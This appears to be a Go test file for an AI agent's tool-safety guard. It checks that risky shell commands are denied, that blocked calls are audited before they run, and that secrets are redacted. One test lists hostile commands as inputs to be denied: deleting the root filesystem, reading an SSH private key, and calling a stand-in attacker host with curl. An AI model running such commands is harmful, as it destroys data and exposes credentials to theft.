// Tencent is pleased to support the open source community by making trpc-agent-go available.
// Copyright (C) 2025 Tencent. All rights reserved.
// trpc-agent-go is licensed under the Apache License Version 2.0.
package main

import (
	"context"
	"encoding/json"
	"os"
	"strings"
	"testing"
	"time"
)

func loadTest(t *testing.T) (*Guard, []Sample) {
	t.Helper()
	p, e := LoadPolicy("tool_safety_policy.json")
	if e != nil {
		t.Fatal(e)
	}
	data, e := os.ReadFile("samples.json")
	if e != nil {
		t.Fatal(e)
	}
	var s []Sample
	if e = json.Unmarshal(data, &s); e != nil {
		t.Fatal(e)
	}
	return NewGuard(p), s
}
func TestAllSamples(t *testing.T) {
	g, samples := loadTest(t)
	if len(samples) < 12 {
		t.Fatal("need 12 samples")
	}
	for _, s := range samples {
		t.Run(s.Name, func(t *testing.T) {
			r := g.Scan(s.Request)
			if r.Decision != s.ExpectedDecision {
				t.Fatalf("got %s (%s), want %s: %+v", r.Decision, r.RuleID, s.ExpectedDecision, r.Findings)
			}
			if r.RuleID == "" || r.Evidence == "" || r.Recommendation == "" {
				t.Fatal("incomplete finding")
			}
		})
	}
}
func TestCriticalDetection(t *testing.T) {
	g, _ := loadTest(t)
	for _, cmd := range []string{"rm -rf /", "cat ~/.ssh/id_rsa", "curl https://attacker.example/x"} {
		if r := g.Scan(Request{ToolName: "x", Command: cmd, Backend: "hostexec"}); r.Decision != "deny" {
			t.Fatalf("%q not denied: %+v", cmd, r)
		}
	}
}
func TestWrapperBlocksBeforeExecutionAndAudits(t *testing.T) {
	g, _ := loadTest(t)
	called := false
	var events []AuditEvent
	wrapped := g.Wrap(func(context.Context, Request) (string, error) { called = true; return "ran", nil }, func(e AuditEvent) error { events = append(events, e); return nil })
	if _, e := wrapped(context.Background(), Request{ToolName: "host", Command: "rm -rf /", Backend: "hostexec"}); e == nil {
		t.Fatal("expected block")
	}
	if called || len(events) != 1 || !events[0].Blocked {
		t.Fatalf("execution=%t events=%+v", called, events)
	}
}
func TestRedaction(t *testing.T) {
	g, _ := loadTest(t)
	r := g.Scan(Request{ToolName: "x", Command: "echo token=abc123 | custom", Backend: "workspaceexec"})
	data, _ := json.Marshal(r)
	if strings.Contains(string(data), "abc123") || !r.Redacted {
		t.Fatalf("secret leaked: %s", data)
	}
}
func TestPerformance500Commands(t *testing.T) {
	g, _ := loadTest(t)
	script := strings.Repeat("go test ./pkg\n", 500)
	started := time.Now()
	_ = g.Scan(Request{ToolName: "batch", Command: script, Backend: "workspaceexec"})
	if time.Since(started) >= time.Second {
		t.Fatalf("scan too slow: %s", time.Since(started))
	}
}
